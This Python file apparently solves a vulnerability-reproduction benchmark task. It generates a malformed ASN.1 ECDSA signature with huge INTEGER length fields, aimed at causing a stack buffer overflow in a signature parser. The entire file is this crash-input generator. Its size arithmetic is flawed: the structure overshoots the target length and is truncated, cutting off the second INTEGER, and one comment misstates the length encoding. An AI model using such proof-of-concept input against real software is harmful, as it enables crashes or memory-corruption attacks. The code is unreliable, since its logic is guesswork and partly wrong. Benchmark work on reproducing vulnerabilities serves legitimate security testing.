import os
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Ground truth length is 41798 bytes
        # We'll create a minimal PoC that's likely to trigger a stack buffer overflow
        # in ECDSA signature parsing from ASN.1
        
        # Typical ASN.1 structure for ECDSA signature: SEQUENCE { r INTEGER, s INTEGER }
        # We'll create malformed ASN.1 with extremely large length fields
        
        # Strategy: Create a SEQUENCE with overly large length that causes buffer overflow
        # when parsing the INTEGER components
        
        # Total target size: 41798 bytes
        target_size = 41798
        
        # Start with ASN.1 SEQUENCE tag
        poc = bytearray()
        
        # SEQUENCE tag (0x30)
        poc.append(0x30)
        
        # Length: We'll use long form to specify remaining length
        # We need total size - 1 (for SEQUENCE tag) = 41797
        remaining = target_size - 1
        
        if remaining <= 127:
            # Short form
            poc.append(remaining)
        elif remaining <= 255:
            # Long form with 1 length byte
            poc.append(0x81)
            poc.append(remaining)
        elif remaining <= 65535:
            # Long form with 2 length bytes
            poc.append(0x82)
            poc.extend(struct.pack('>H', remaining))
        else:
            # Long form with 3 length bytes (41797 fits in 3 bytes)
            poc.append(0x83)
            # 41797 in hex: 0x00A345
            poc.extend(struct.pack('>I', remaining)[1:])  # Take last 3 bytes
        
        # Now fill with INTEGER components that are malformed
        # We need to fill remaining bytes
        
        current_size = len(poc)
        bytes_needed = target_size - current_size
        
        if bytes_needed > 0:
            # Create first INTEGER with huge length
            # INTEGER tag
            poc.append(0x02)
            
            # Length of INTEGER value - make it huge to cause overflow
            int_len = bytes_needed - 5  # Reserve space for tag, length bytes, and second INTEGER
            
            if int_len <= 127:
                poc.append(int_len)
            elif int_len <= 255:
                poc.append(0x81)
                poc.append(int_len)
            elif int_len <= 65535:
                poc.append(0x82)
                poc.extend(struct.pack('>H', int_len))
            else:
                poc.append(0x83)
                poc.extend(struct.pack('>I', int_len)[1:])
            
            # Fill INTEGER value with pattern that might exploit the vulnerability
            # Using 0xFF bytes which are valid in INTEGER encoding (two's complement)
            poc.extend(b'\xFF' * int_len)
            
            # Add minimal second INTEGER to complete the structure
            poc.append(0x02)  # INTEGER tag
            poc.append(0x01)  # Length 1
            poc.append(0x00)  # Value 0
        
        # Ensure exact size
        if len(poc) < target_size:
            poc.extend(b'A' * (target_size - len(poc)))
        elif len(poc) > target_size:
            poc = poc[:target_size]
        
        return bytes(poc)